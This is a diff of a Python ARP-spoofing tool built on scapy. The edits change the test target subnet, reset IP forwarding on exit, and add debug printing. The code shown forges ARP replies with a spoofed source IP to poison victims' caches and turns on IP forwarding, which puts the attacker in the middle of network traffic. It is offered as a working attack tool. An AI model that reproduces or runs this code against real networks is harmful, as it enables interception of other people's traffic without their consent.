@@ -1,7 +1,6 @@
 import scapy.all as scapy 
 import optparse
 import time
-
 class ARP_SPOOFER():
     def __init__(self):
         self.options = ""
@@ -10,7 +9,7 @@ class ARP_SPOOFER():
         self.doer()
        
     def test(self):
-        self.options = {"targets":["10.0.0.0/24"]}
+        self.options = {"targets":["172.16.0.0/24"]}
         self.targets = self.options["targets"] 
 
 
@@ -33,6 +32,9 @@ class ARP_SPOOFER():
         #when the user click ctrl + c , this code will work first
         except KeyboardInterrupt :
             print("\n [-] CTRL + C Detected .... Quitting  \n ")
+            self.portforward(True,"0")
+            print("\n [+] Made by : MOBO [+] \n ")
+
 
     def get_info(self):
         parser = optparse.OptionParser()
@@ -51,10 +53,10 @@ class ARP_SPOOFER():
             return options
 
 
-    def portforward(self,state):
+    def portforward(self,state,val="1"):
         if state : 
             with open("/proc/sys/net/ipv4/ip_forward","w") as file : 
-                file.write("1")
+                file.write(val)
         else : 
             pass
 
@@ -112,7 +114,7 @@ class ARP_SPOOFER():
                         continue
                     else :
                         arp_response = scapy.ARP(op=2,psrc=f["ip"],pdst=t["ip"],hwdst=t["mac"])
-                        
+                        print(t["mac"])
                         scapy.send(arp_response,verbose=False)
                         print(f"\r [+] Packet sent : {i} ", end="")
                         i += 1
